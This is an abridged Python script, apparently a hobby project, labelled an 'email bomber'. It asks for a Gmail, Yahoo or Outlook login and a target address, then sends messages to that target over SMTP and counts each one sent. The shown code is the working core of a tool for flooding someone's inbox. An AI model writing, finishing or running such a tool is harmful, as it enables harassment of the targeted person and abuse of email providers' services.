...
def banner():
    ...
    print(bcolors.GREEN + "FAISAL's EMAIL_BOMBER PROJECT")
...
class Email_Bomber:
    ...
    def email(self):
        try:
            print(bcolors.RED + '+[+[+[ Settion up Email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premode options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            ...
            self.fromAdd = str(input(bcolors.GREEN + 'Enter from address <: '))
            ...
            self.msg =  '''From: %s\nTo: %s\nSubject %s\n%s\n
            '''% (self.fromAdd, self.target, self.subject, self.message)
            
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAdd, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')
    ...
    def send(self):
        try:
            self.s.sendmail(self.fromAdd, self.target, self.msg)
            self.count+=1
